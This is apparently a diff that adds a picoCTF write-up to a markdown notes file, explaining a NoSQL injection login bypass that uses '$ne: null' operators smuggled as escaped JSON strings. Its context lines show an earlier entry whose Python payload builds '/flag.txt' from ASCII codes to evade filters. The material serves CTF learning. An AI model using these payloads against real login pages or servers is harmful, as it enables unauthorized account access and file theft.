@@ -269,3 +269,36 @@ Payload:
 open(''.join([chr(x) for x in [47,102,108,97,103,46,116,120,116]])).read()
 ```
 Construct `/flag.txt` using ASCII codes (to bypass filters) and read the flag that's in the response.
+
+---
+
+### ID 443 — No Sql Injection
+
+## Approach:
+The backend checks login in a way that if the input is a string that *looks* like JSON, it gets parsed into a MongoDB query operator. → NoSQL injection.
+
+1. Exploit
+Send JSON where email and password are strings containing escaped JSON. When the server parses them, they become Mongo operators that match any user.
+
+Payload:
+```
+{
+  "email": "{\"$ne\": null}",
+  "password": "{\"$ne\": null}"
+}
+```
+The server turns this into:
+```
+email: { $ne: null }
+password: { $ne: null }
+```
+→ This returns the first user (admin/picoplayer).
+
+2. Result
+Server responds with a token:
+```
+"token": "BASE64_STRING"
+```
+3. Decode it and it reveals the picoCTF flag.
+
+
